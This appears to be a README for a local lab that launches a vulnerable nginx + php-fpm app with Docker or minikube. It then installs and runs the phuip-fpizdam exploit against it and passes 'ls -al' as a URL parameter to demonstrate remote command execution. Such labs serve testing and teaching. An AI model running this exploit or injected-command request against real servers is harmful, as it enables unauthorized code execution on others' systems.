# How-to ?

## Docker

Launch vulnerable apps :

```sh
docker-compose up -d
```

## Kubernetes

Launch minikube :

```sh
minikube start --ports 8080:8080
```

Deploy the vulnerable app :

```sh
kubectl apply -f vuln.yaml
```

## Exploit

Get the exploit and launch it against the vulnerable nginx + php-fpm

```sh
go get -v github.com/neex/phuip-fpizdam
go install github.com/neex/phuip-fpizdam
phuip-fpizdam http://localhost:8080/index.php
```

Test with a command passing a command as the `a` parameter to the hello-world page:
(for an unknown reason you might have to launch it twice)

```sh
curl "http://localhost:8080/index.php?a=ls -al"
```
